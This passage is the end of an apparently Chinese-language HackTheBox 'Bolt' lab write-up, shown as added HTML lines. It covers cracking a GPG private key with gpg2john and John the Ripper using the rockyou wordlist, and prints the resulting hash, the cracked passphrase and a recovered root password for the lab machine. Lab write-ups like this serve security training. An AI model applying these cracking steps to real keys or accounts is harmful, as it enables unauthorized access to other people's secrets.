+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302145773.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302145773.png" /></p>
+<p>用前面已知的去试了一下好像都不对,要用<code>john</code>去爆破了&hellip;</p>
+<p><a href="https://www.openwall.com/lists/john-users/2012/11/08/6" target="_blank" rel="noopener noreffer ">Noob: trying to recover own gpg/pgp passphrase with limited set of characters</a></p>
+<p>这篇文章说要先把<code>gpg</code>格式转化成<code>john</code>可以读取的<code>hash</code>格式</p>
+<p><a href="https://blog.atucom.net/2015/08/cracking-gpg-key-passwords-using-john.html" target="_blank" rel="noopener noreffer ">Cracking GPG key passwords using John The Ripper </a></p>
+<p><del>有个叫<code>gpg2john</code>的工具,不知道为啥系统里面的john没有这个工具&hellip;</del></p>
+<p><del>瞄了眼wp,密码是<code>merrychristmas</code></del></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">git clone git://github.com/magnumripper/JohnTheRipper -b bleeding-jumbo john
+</span></span><span class="line"><span class="cl">cd john/src
+</span></span><span class="line"><span class="cl">./configure &amp;&amp; make -s clean &amp;&amp; make -sj4
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>在<code>john/run</code>中得到<code>gpg2john</code></p>
+<p><code>./gpg2john -d eddie.key &gt; eddie.hash</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201311100853.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201311100853.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201311100853.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201311100853.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201311100853.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201311100853.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Eddie Johnson:$gpg$*1*668*2048*2b518595f971db147efe739e2716523786988fb0ee243e5981659a314dfd0779dbba8e14e6649ba4e00cc515b9b4055a9783be133817763e161b9a8d2f2741aba80bceef6024465cba02af3bccd372297a90e078aa95579afbd60b6171cd82fd1b32a9dd016175c088e7bef9b883041eaffe933383434752686688f9d235f1d26c006a698dd6cc132d8acb94c4eceebf010845d69cd9e114873538712f2cd50c8b9ca3bcb9bbc3d83e32564f99031776ac986195e643880483ac80d3f7f1b9143563418ddea7bb71d114c4f24e41134dcdac4662e934d955aeccae92038dbed32f300ac5abed65960e26486c5da59f0d17b71ad9a8fe7a5e6bb77b8c31b68b56e7f4025f01d534be45ab36a7c0818febe23fa577ca346023feefa2bfef0899dd860e05a54d8b3e8bd430f40791a52a20067fde1861d977adf222725658a4661927d65b877cb8ac977601990cfbdb27413f5acc25ff1f691556bc8e5264cffaebbea7e7b9d73de6c719e0a7b004d331eaada86e812e3db60904eaf73a1b79c6e68e74beb6b71f6d644afbf591426418976d68c4e580cbc60b6fdd113f239ae2acd1e1dc51cb74b96b3c2f082bc0214886e1c3cebb3611311d9112d61194df22fb3ceb5783ee7d4a61b544886b389f638fc85d5139f64997014ec38ac59e65b842d92afb50184ccc3549a57dcdb3fc8720cc394912aed931007b53da1c635d302e840da2e6342803831891ab1ccc1669f3cc3240b8d31eded96696d7ad1525c4d277a4d3123abecafdbdde207714539c2e546cd45c4452051394e5d00e711fa5353f817be4fa6827aa0f1428dfb93a918e93975fb4baf3297aa3b7fec33470cf2741237a629b869a762684602057f3e3e6df9c97631caa7589dc4b26653162dfb2f2cf508cbe375496ba735830c2c00f151cdd50c522afe33dbe4265d2*3*254*8*9*16*00000000000000000000000000000000*16777216*34af9ef3956d5ad8:::Eddie Johnson &lt;eddie@bolt.htb&gt;::eddie.key
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>./john --wordlist=rockyou.txt eddie.hash</code>进行爆破,得到密码为<code>merrychristmas</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302207288.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302207288.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302207288.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302207288.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302207288.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302207288.png" /></p>
+<p>得到一个新的密码<code>Z(2rmxsNW(Z?3=p/9s</code>,应该是<code>root</code>或者是<code>clark</code>的密码,验证确认是<code>root</code>密码</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302208807.png"
+        data-srcset="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302208807.png, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302208807.png 1.5x, https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302208807.png 2x"
+        data-sizes="auto"
+        alt="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302208807.png"
+        title="https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/202201302208807.png" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-01-06</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/htb-archetype/" class="prev" rel="prev" title="HackTheBox-Archetype"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox-Archetype</a>
+            <a href="/htb-forge/" class="next" rel="next" title="HackTheBox-Forge">HackTheBox-Forge<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Mi3aka</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.zh.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":30},"comment":{},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"zh","lunrSegmentitURL":"/lib/lunr/lunr.segmentit.js","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
